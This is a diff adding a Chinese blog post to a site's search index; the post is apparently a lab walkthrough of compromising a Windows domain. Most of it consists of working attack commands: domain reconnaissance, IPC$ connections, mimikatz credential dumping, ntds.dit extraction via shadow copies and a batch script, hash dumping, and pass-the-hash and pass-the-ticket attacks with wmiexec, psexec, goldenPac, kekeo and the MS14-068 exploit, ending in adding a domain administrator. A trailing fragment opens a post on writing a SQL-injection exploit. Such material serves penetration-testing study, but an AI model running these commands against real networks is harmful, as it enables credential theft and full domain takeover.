@@ -3,6 +3,99 @@
   
     
     <entry>
+      <title><![CDATA[windows域渗透实战]]></title>
+      <url>/2018/03/13/windows_hack_domain.html</url>
+      <content type="html"><![CDATA[<h5 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">域控： 192.168.211.130</div><div class="line"></div><div class="line">已经控制的机器： 192.168.211.133</div></pre></td></tr></table></figure>
+<h5 id="获取网络信息"><a href="#获取网络信息" class="headerlink" title="获取网络信息"></a>获取网络信息</h5><p>查看机器的网络信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ipconfig /all  # 查看 网卡信息，获取dns 服务器ip (域控)</div><div class="line">arp -a  # 搜集内网信息</div></pre></td></tr></table></figure></p>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1520950411589y29cwo4w.png?imageslim" alt="paste image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">net view   #查看网络中的机器</div><div class="line">net view /domain # 查看网络中的域</div><div class="line">net view /domain:domainhack  # 查看 domainhack 域中的机器</div></pre></td></tr></table></figure>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1520950614947ic0x8s5b.png?imageslim" alt="paste image"></p>
+<p>通过 <code>ping 机器名</code> 可以获取 <code>ip</code><br><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1520950744184fmjwgnhx.png?imageslim" alt="paste image"></p>
+<h6 id="查找-域控"><a href="#查找-域控" class="headerlink" title="查找 域控"></a>查找 域控</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">dsquery server</div><div class="line">net time /domain</div><div class="line">ipconfig /all  查看 dns 信息</div><div class="line">端口扫描，域控服务器会开放389端口，如果和DNS同服务器，那么也会有53</div></pre></td></tr></table></figure>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1520951045423iaaxkpia.png?imageslim" alt="paste image"></p>
+<p><code>ipc$</code> 攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net view 192.168.211.130   #查看共享</div><div class="line">net use \\192.168.211.130\ipc$ password /user:hacker  # ipc$ 连接</div></pre></td></tr></table></figure>
+<p>如果有共享的话，直接 <code>copy</code> 复制文件，然后 <code>at</code> 执行。</p>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/15209516981727fpi3bhx.png?imageslim" alt="paste image"></p>
+<h5 id="获取-hash"><a href="#获取-hash" class="headerlink" title="获取 hash"></a>获取 hash</h5><h6 id="直接抓"><a href="#直接抓" class="headerlink" title="直接抓"></a>直接抓</h6><p>使用   <code>mimikatz</code> 抓取登录过的明文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; pssword.txt</div></pre></td></tr></table></figure>
+<h6 id="导出-ntds-dit-获取-hash"><a href="#导出-ntds-dit-获取-hash" class="headerlink" title="导出 ntds.dit, 获取 hash"></a>导出 <code>ntds.dit</code>, 获取 <code>hash</code></h6><p><strong>导出 <code>ntds.dit</code></strong></p>
+<p>方法一 <code>ntdsutil</code></p>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1520993333344px965pcr.png?imageslim" alt="paste image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot &quot;List All&quot; quit quit   # 列举快照</div><div class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit #  创建快照</div><div class="line">ntdsutil snapshot &quot;mount  &#123;6a1e7947-a095-431b-a625-931899c87c63&#125;&quot;  # 挂载快照</div><div class="line"> copy C:\$SNAP_201803141006_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit  #复制ntds.dit</div></pre></td></tr></table></figure>
+<p>操作完后记得删除快照</p>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/152099352112088bzwldz.png?imageslim" alt="paste image"></p>
+<p>方法二 <code>vssadmin</code></p>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1520993649818z99tu6w7.png?imageslim" alt="paste image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vssadmin list shadows # 查询当前系统的快照</div><div class="line">vssadmin create shadow /for=c: #创建快照</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\ntds.dit #  复制ntds.dit</div><div class="line">vssadmin delete shadows /for=c: /quiet #删除快照</div></pre></td></tr></table></figure>
+<p>方法三 <code>vshadow</code><br>下载链接 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://edgylogic.com/blog/vshadow-exe-versions/</div></pre></td></tr></table></figure>
+<p>创建 <code>a.bat</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">setlocal</div><div class="line">if NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACK</div><div class="line">set SOURCE_DRIVE_LETTER=%SystemDrive%</div><div class="line">set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit</div><div class="line">set DESTINATION_PATH=%~dp0</div><div class="line">@echo ...Determine the scripts to be executed/generated...</div><div class="line">set CALLBACK_SCRIPT=%~dpnx0</div><div class="line">set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd</div><div class="line">@echo ...Creating the shadow copy...</div><div class="line">&quot;%~dp0vshadow-2008-x64.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%</div><div class="line">del /f %TEMP_GENERATED_SCRIPT%</div><div class="line">@goto :EOF</div><div class="line">:IS_CALLBACK</div><div class="line">setlocal</div><div class="line">@echo ...Obtaining the shadow copy device name...</div><div class="line">call %TEMP_GENERATED_SCRIPT%</div><div class="line">@echo ...Copying from the shadow copy to the destination path...</div><div class="line">copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%</div></pre></td></tr></table></figure>
+<p>把 <code>vshadow-2008-x64.exe</code> 放到 <code>a.bat</code> 同级目录（win 2008为例）<br>然后 <code>cmd /c start a.bat</code> 调用之， 就会在 <code>a.bat</code> 目录下生成 <code>ntds.dit</code></p>
+<p>然后使用 </p>
+<p><strong>获取 <code>system.hiv</code></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg save hklm\system system.hiv</div></pre></td></tr></table></figure>
+<p><strong><code>QuarksPwDump.exe</code> 导出 <code>hash</code></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file ntds.dit --system-file  system.hiv</div></pre></td></tr></table></figure>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/15209950685933bnh14z7.png?imageslim" alt="paste image"></p>
+<h5 id="pass-the-hash-攻击"><a href="#pass-the-hash-攻击" class="headerlink" title="pass-the-hash 攻击"></a>pass-the-hash 攻击</h5><p><strong>wmiexec</strong></p>
+<p>下载地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/maaaaz/impacket-examples-windows</div></pre></td></tr></table></figure>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1521015033961czszyfv6.png?imageslim" alt="paste image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wmiexec -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09 domainhack/Administrator@192.168.211.130 &quot;whoami&quot;</div><div class="line"></div><div class="line"></div><div class="line">domainhack 为域名</div><div class="line">Administrator  域用户</div><div class="line">192.168.211.130  目标 IP</div></pre></td></tr></table></figure>
+<p><strong>psexec</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">psexec.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09 domainhack/Administrator@192.168.211.130 &quot;whoami&quot;</div></pre></td></tr></table></figure>
+<p><strong>pass-the-ticket</strong></p>
+<p><strong>goldenPac</strong></p>
+<p>要求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">域名， 普通域用户账号密码， 域控名</div></pre></td></tr></table></figure>
+<p>下载地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/maaaaz/impacket-examples-windows</div></pre></td></tr></table></figure>
+<p>直接获取域控<code>system</code> 权限的 <code>cmd</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">goldenPac domainhack.com/hacker@domainc.domainhack.com</div><div class="line">goldenPac 域名/用户名@域控名称</div><div class="line">然后会要求输入密码</div></pre></td></tr></table></figure>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/15210238656081vpxiybt.png?imageslim" alt="paste image"></p>
+<p><strong>wce</strong></p>
+<p>要求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">域控用户名 ，hash (用前面的方法获取)</div><div class="line">本机 administor 权限</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wce -s Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09</div></pre></td></tr></table></figure>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/15210249279984s06gvwf.png?imageslim" alt="paste image"></p>
+<p><strong>keko</strong></p>
+<p>下载地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/gentilkiwi/kekeo</div></pre></td></tr></table></figure>
+<p>要求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">域控用户名 ，hash (用前面的方法获取)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">生成票据</div><div class="line">kekeo &quot;tgt::ask /user:Administrator /domain:domainhack.com /ntlm:A812E6C2DEFCB0A7B80868F9F3C88D09&quot;</div><div class="line"></div><div class="line">导入票据</div><div class="line">kekeo &quot;kerberos::ptt TGT_Administrator@DOMAINHACK.COM_krbtgt~domainhack.com@DOMAINHACK.COM.kirbi&quot;</div></pre></td></tr></table></figure>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1521026110555ghmytb2c.png?imageslim" alt="paste image"></p>
+<p><strong>ms14-068.exe</strong></p>
+<p>下载地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-068/MS14-068.exe</div></pre></td></tr></table></figure>
+<p>要求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">域控用户名 ， 密码</div><div class="line">用户 sid  # whoami /all 获取</div></pre></td></tr></table></figure>
+<p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">生成 票据</div><div class="line">ms14-068.exe -u hacker@domainhack.com -s S-1-5-21-2864277510-2444243591-773573486-1113 -d 192.168.211.130 -p qaz123!@#</div><div class="line"></div><div class="line"></div><div class="line">ms14-068.exe -u 用户名@域名 -s 用户sid -d 域控地址 -p 用户名密码</div><div class="line">导入票据</div><div class="line"></div><div class="line">Mimikatz.exe &quot;kerberos::ptc TGT_hacker@domainhack.com.ccache&quot;</div></pre></td></tr></table></figure>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1521026906444ehigwbqz.png?imageslim" alt="paste image"></p>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1521026940394zp6yemd5.png?imageslim" alt="paste image"></p>
+<p>导入票据后就相当于有了 域管理员的权限， 直接添加域管理员</p>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/15210277473270y3njzoe.png?imageslim" alt="paste image"></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 渗透测试 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> windows域 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[然之协同系统6.4.1 SQL注入之exp编写]]></title>
       <url>/2018/03/13/ranzhi_oa_641_exp.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面已经说明了 漏洞成因，这里介绍一下 <code>exp</code> 的编写。</p>
